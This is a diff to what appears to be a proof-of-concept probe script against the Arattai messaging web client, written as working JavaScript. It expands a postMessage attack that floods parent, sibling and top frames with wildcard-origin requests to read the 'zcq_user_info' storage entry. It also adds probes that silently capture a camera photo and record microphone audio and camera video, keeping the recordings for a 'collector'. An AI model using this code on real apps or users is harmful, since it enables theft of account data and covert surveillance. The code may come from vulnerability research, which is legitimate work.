@@ -179,12 +179,16 @@
     function probePostMessageBridge() {
         return probe("postMessage Storage Bridge (Web client — W2)", function() {
             // This probe targets the db-handler.js storage iframe in the Arattai web shell.
-            // It only fires meaningful results when the mini-app runs inside the Arattai web app.
+            // db-handler.js listens for { type: 'LocalStorageRequest', params, requestId }
+            // and responds with event.source.postMessage({ type: 'LocalStorageResponse', result }, event.origin).
+            // It fires meaningful results when the mini-app runs inside the Arattai web app as a sibling iframe.
+            var referrer = document.referrer || "";
             var isInsideArattaiWeb = (
                 window.parent !== window &&
                 (
-                    (document.referrer && document.referrer.indexOf("arattai") >= 0) ||
-                    client.id === "browser"
+                    referrer.indexOf("arattai") >= 0 ||
+                    client.id === "browser" ||
+                    client.id === "electron"
                 )
             );
             if (!isInsideArattaiWeb) {
@@ -193,62 +197,196 @@
 
             return new Promise(function(resolve, reject) {
                 var results = {};
-                var pending = 0;
                 var done = false;
+                var requestId = "poc-" + Date.now();
+
+                function sendRequest(target) {
+                    try {
+                        target.postMessage({
+                            type: "LocalStorageRequest",
+                            params: { methodName: "getItem", arguments: "zcq_user_info" },
+                            requestId: requestId
+                        }, "*");
+                    } catch(e2) { /* cross-origin — postMessage itself is allowed; ignore other errors */ }
+                }
 
                 function finish() {
                     if (done) return;
                     done = true;
+                    window.removeEventListener("message", handler);
                     if (Object.keys(results).length > 0) {
-                        resolve("storage bridge responded: " + JSON.stringify(results, null, 2));
+                        resolve("STORAGE BRIDGE VULN — " + Object.keys(results)[0] +
+                                " received from origin: " + results.__origin +
+                                " · value: " + String(results[Object.keys(results)[0]]).slice(0, 200));
                     } else {
                         var e = new Error();
-                        e.__probeResult = { status: "SAFE", detail: "no response from storage bridge within timeout" };
+                        e.__probeResult = { status: "SAFE", detail: "no response from storage bridge within 10 s timeout" };
                         reject(e);
                     }
                 }
 
-                var timer = setTimeout(finish, 5000);
+                var timer = setTimeout(finish, 10000);
 
-                window.addEventListener("message", function handler(event) {
+                function handler(event) {
                     var type = event.data && event.data.type;
                     if (type === "LocalStorageResponse" || type === "SessionStorageResponse" || type === "IDBResponse") {
-                        results[type] = event.data.result || event.data.error;
-                        clearTimeout(timer);
-                        done = true;
-                        resolve("STORAGE BRIDGE VULN — " + type + " received from origin: " + event.origin +
-                                " value: " + JSON.stringify(results[type]).slice(0, 200));
-                        window.removeEventListener("message", handler);
+                        if (!done) {
+                            results[type] = event.data.result !== undefined ? event.data.result : event.data.error;
+                            results.__origin = event.origin;
+                            clearTimeout(timer);
+                            finish();
+                        }
                     }
-                });
-
-                // Try to find and message the storage iframe
-                // The storage iframe announces itself with type:'arattai_iframe_loaded'
-                // We broadcast to parent and hope it reaches the storage iframe sibling
-                var requestId = "poc-" + Date.now();
-
-                // Method 1: postMessage to parent (parent relays if it has the bridge)
-                if (window.parent !== window) {
-                    window.parent.postMessage({
-                        type: "LocalStorageRequest",
-                        params: { methodName: "getItem", arguments: "zcq_user_info" },
-                        requestId: requestId
-                    }, "*");
+                    // If the storage iframe announces itself AFTER our probe fires, immediately send the request
+                    if (type === "arattai_iframe_loaded" && !done) {
+                        sendRequest(event.source);
+                    }
                 }
 
-                // Method 2: enumerate parent frames looking for the storage iframe
+                window.addEventListener("message", handler);
+
+                // Blast to parent and all sibling frames (db-handler.js runs in a child iframe of the shell)
+                if (window.parent !== window) {
+                    sendRequest(window.parent);
+                }
                 if (window.parent && window.parent.frames) {
                     for (var i = 0; i < window.parent.frames.length; i++) {
-                        try {
-                            window.parent.frames[i].postMessage({
-                                type: "LocalStorageRequest",
-                                params: { methodName: "getItem", arguments: "zcq_user_info" },
-                                requestId: requestId
-                            }, "*");
-                        } catch(e2) { /* cross-origin frame — ignore */ }
+                        sendRequest(window.parent.frames[i]);
                     }
                 }
+                // Also try top-level frames (handles nested iframe scenarios)
+                if (window.top && window.top !== window.parent && window.top.frames) {
+                    for (var j = 0; j < window.top.frames.length; j++) {
+                        sendRequest(window.top.frames[j]);
+                    }
+                }
+                // Retry after 2 s in case storage iframe loads lazily
+                setTimeout(function() {
+                    if (done) return;
+                    if (window.parent !== window) sendRequest(window.parent);
+                    if (window.parent && window.parent.frames) {
+                        for (var k = 0; k < window.parent.frames.length; k++) {
+                            sendRequest(window.parent.frames[k]);
+                        }
+                    }
+                }, 2000);
             });
+        });
+    }
+
+    // 11. Camera photo capture
+    function probeCameraCapture() {
+        return probe("Camera Photo Capture", function() {
+            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                na("getUserMedia not available");
+            }
+            // No constraints — bare {video:true} avoids OverconstrainedError on Android WebView
+            return navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+                .then(function(stream) {
+                    return new Promise(function(resolve, reject) {
+                        var video = document.createElement("video");
+                        video.muted = true;
+                        video.playsInline = true;
+                        video.srcObject = stream;
+                        video.play();
+                        setTimeout(function() {
+                            try {
+                                var w = video.videoWidth  || 320;
+                                var h = video.videoHeight || 240;
+                                var canvas = document.createElement("canvas");
+                                canvas.width  = Math.min(w, 640);
+                                canvas.height = Math.min(h, 480);
+                                canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
+                                var dataUrl = canvas.toDataURL("image/jpeg", 0.6);
+                                stream.getTracks().forEach(function(t) { t.stop(); });
+                                window.__capturedPhoto = dataUrl;
+                                resolve("PHOTO CAPTURED (" + canvas.width + "×" + canvas.height + ") — " +
+                                        Math.round(dataUrl.length * 3 / 4 / 1024) + " KB — sending to collector");
+                            } catch(e2) {
+                                stream.getTracks().forEach(function(t) { t.stop(); });
+                                var err = new Error();
+                                err.__probeResult = { status: "SAFE", detail: "capture error: " + (e2.name || "") + " " + e2.message };
+                                reject(err);
+                            }
+                        }, 2500);
+                    });
+                }).catch(function(e) { safe((e.name || "Error") + ": " + e.message); });
+        });
+    }
+
+    // 12. Microphone audio recording (5 s)
+    // Delayed 1.5 s so probeMediaDevices (probe 8) finishes and releases the mic before we acquire it
+    function probeAudioRecord() {
+        return probe("Microphone Audio Recording (5 s)", function() {
+            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) { na("getUserMedia not available"); }
+            if (typeof MediaRecorder === "undefined") { na("MediaRecorder not supported in this browser"); }
+            return new Promise(function(r) { setTimeout(r, 1500); }).then(function() {
+                return navigator.mediaDevices.getUserMedia({ audio: true });
+            }).then(function(stream) {
+                return new Promise(function(resolve, reject) {
+                    var chunks = [];
+                    var rec;
+                    try { rec = new MediaRecorder(stream); }
+                    catch(e2) {
+                        stream.getTracks().forEach(function(t) { t.stop(); });
+                        var err = new Error();
+                        err.__probeResult = { status: "SAFE", detail: "MediaRecorder init: " + (e2.name || "") + " " + e2.message };
+                        reject(err); return;
+                    }
+                    rec.ondataavailable = function(e) { if (e.data && e.data.size > 0) chunks.push(e.data); };
+                    rec.onstop = function() {
+                        stream.getTracks().forEach(function(t) { t.stop(); });
+                        var blob = new Blob(chunks, { type: rec.mimeType || "audio/webm" });
+                        var reader = new FileReader();
+                        reader.onload = function() {
+                            window.__capturedAudio = reader.result;
+                            resolve("AUDIO RECORDED: " + Math.round(blob.size / 1024) + " KB" +
+                                    " (" + (rec.mimeType || "audio/webm") + ") — sending to collector");
+                        };
+                        reader.readAsDataURL(blob);
+                    };
+                    rec.start(200);
+                    setTimeout(function() { try { rec.stop(); } catch(e3) {} }, 5000);
+                });
+            }).catch(function(e) { safe((e.name || "Error") + ": " + e.message); });
+        });
+    }
+
+    // 13. Camera + mic video recording (5 s)
+    // Starts at 7 s — after audio probe (1.5 s delay + 5 s recording) finishes and releases both mic and camera
+    function probeVideoRecord() {
+        return probe("Camera+Mic Video Recording (5 s)", function() {
+            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) { na("getUserMedia not available"); }
+            if (typeof MediaRecorder === "undefined") { na("MediaRecorder not supported in this browser"); }
+            return new Promise(function(res) { setTimeout(res, 7000); }).then(function() {
+                return navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+            }).then(function(stream) {
+                return new Promise(function(resolve, reject) {
+                    var chunks = [];
+                    var rec;
+                    try { rec = new MediaRecorder(stream); }
+                    catch(e2) {
+                        stream.getTracks().forEach(function(t) { t.stop(); });
+                        var err = new Error();
+                        err.__probeResult = { status: "SAFE", detail: "MediaRecorder init: " + (e2.name || "") + " " + e2.message };
+                        reject(err); return;
+                    }
+                    rec.ondataavailable = function(e) { if (e.data && e.data.size > 0) chunks.push(e.data); };
+                    rec.onstop = function() {
+                        stream.getTracks().forEach(function(t) { t.stop(); });
+                        var blob = new Blob(chunks, { type: rec.mimeType || "video/webm" });
+                        var reader = new FileReader();
+                        reader.onload = function() {
+                            window.__capturedVideo = reader.result;
+                            resolve("VIDEO RECORDED: " + Math.round(blob.size / 1024) + " KB" +
+                                    " (" + (rec.mimeType || "video/webm") + ") — sending to collector");
+                        };
+                        reader.readAsDataURL(blob);
+                    };
+                    rec.start(200);
+                    setTimeout(function() { try { rec.stop(); } catch(e3) {} }, 5000);
+                });
+            }).catch(function(e) { safe((e.name || "Error") + ": " + e.message); });
         });
     }
 
@@ -280,7 +418,10 @@
                 probeGeolocation(),
                 probeMediaDevices(),
                 probePostMessageBridge(),
-                probeElectronBridge()
+                probeElectronBridge(),
+                probeCameraCapture(),
+                probeAudioRecord(),
+                probeVideoRecord()
             ]);
         }
     };
